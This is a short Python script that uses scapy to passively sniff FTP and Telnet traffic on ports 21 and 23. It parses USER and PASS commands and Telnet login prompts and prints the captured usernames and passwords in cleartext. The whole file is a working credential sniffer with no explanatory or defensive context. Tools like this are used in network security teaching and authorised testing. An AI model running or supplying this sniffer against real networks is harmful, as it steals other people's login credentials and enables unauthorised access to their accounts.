from scapy.all import sniff, TCP, Raw

buffer = ""
waiting_for = ""
clean_text = ""

def process_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        global buffer
        global waiting_for
        global clean_text
        source_port = packet[TCP].sport
        dest_port = packet[TCP].dport
        payload = packet[Raw].load

        try:
            string_payload = payload.decode(errors="ignore")
        except UnicodeDecodeError:
            return

        if source_port in (21, 23):
            if "login" in string_payload:
                waiting_for = "user"
            elif "Password" in string_payload:
                waiting_for = "password"

        elif dest_port in (21, 23):
            if dest_port == 21:
                parts = string_payload.split()
                if parts[0] == "USER":
                    print(f"{parts[0]}: {parts[1]}")
                elif parts[0] == "PASS":
                    print(f"{parts[0]}: {parts[1]}")

            elif dest_port == 23:
                clean_text = ""
                for character in string_payload:
                    if character.isprintable():
                        clean_text += character

                buffer += clean_text
                if "\r" in string_payload:
                    print(f"{waiting_for}: {buffer.strip()}")
                    waiting_for = ""
                    buffer = ""

    else:
        return

sniff(filter="tcp port 21 or tcp port 23", prn=process_packet, store=False)